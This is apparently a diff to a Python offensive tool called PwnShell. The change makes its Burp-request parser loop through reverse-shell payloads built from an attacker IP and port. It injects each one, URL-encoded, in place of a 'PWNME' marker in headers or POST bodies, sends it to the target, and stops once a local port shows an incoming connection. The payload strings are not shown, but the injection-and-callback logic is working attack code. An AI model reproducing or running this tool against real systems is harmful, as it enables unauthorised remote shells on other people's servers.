@@ -153,9 +153,9 @@ class PwnShell:
             for payload in payloads:
                 self.req_get(payload)
         elif self.file:
-            for payload in payloads:
-                self.req_get(payload)
             self.parse_file()  # this also sends the request
+
+
         else:
             return False
 
@@ -197,22 +197,28 @@ class PwnShell:
     ######################################################################################
     ###################################  PARSER BURPREQUEST #################################
     def parse_file(self):
-        proxies = {'https': 'https://127.0.0.1:8080'}
-        request, post_data = burpee.parse_request(self.file)  # Don;t change
-        for r in request:
-            if request[r] == "PWNME":
-                request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
-            if r == "Host":
-                url = 'http://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
-                print(url)
-        if post_data:
-            post_data = post_data.replace("PWNME", encoded_payload)
-            req =requests.post(url,headers=request,data=post_data,verify=False)
-            print(req.status_code)
-            print()
-        else:
-            req = requests.get(url,headers=request,verify=False)
-            print(req.status_code)
+        payloads = PayLoads(self.ip, self.port).payloads()
+        for payload in payloads:
+            proxies = {'https': 'https://127.0.0.1:8080'}
+            encoded_payload = self.get_url_encoded_payload(payload)
+            request, post_data = burpee.parse_request(self.file)  # Don;t change
+            for r in request:
+                if request[r] == "PWNME":
+                    request[r] = request[r].replace("PWNME", encoded_payload)  # THE PAYLOAD
+                if r == "Host":
+                    url = 'http://'+ request[r] + burpee.get_method_path(self.file)  #CONCATE WITH PATH
+                    print(url)
+            if post_data:
+                post_data = post_data.replace("PWNME", encoded_payload)
+                req =requests.post(url,headers=request,data=post_data,verify=False)
+                print(req.status_code)
+                print()
+            else:
+                req = requests.get(url,headers=request,verify=False)
+                print(req.status_code)
+            time.sleep(5)
+            if self.is_port_in_use():
+                break
 
     #########################################################################################
     ###################################  ENCODING PAYLOADS #################################
